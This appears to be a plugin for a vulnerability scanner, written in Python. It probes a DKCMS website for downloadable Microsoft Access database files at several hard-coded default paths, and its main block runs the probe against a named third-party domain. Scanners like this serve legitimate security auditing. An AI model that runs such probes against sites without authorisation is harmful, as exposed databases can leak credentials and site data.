#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Ario'

def assign(service, arg):
    if service == "dkcms":
        return True, arg

def audit(arg):
    url = arg
    for db in ['data/dkcm_ssdfhwejkfs.mdb', '_data/___dkcms_30_free.mdb', '_data/I^(()UU()H.mdb']:
        code, head, _, _, _ = curl.curl('-I ' + url + db)
        if code == 200 and head.find('application/x-msaccess') != -1:
            security_hole(url + db)
            break

if __name__ == '__main__':
    from dummy import *
    audit(assign('dkcms', 'http://www.gxltgroup.com/')[1])

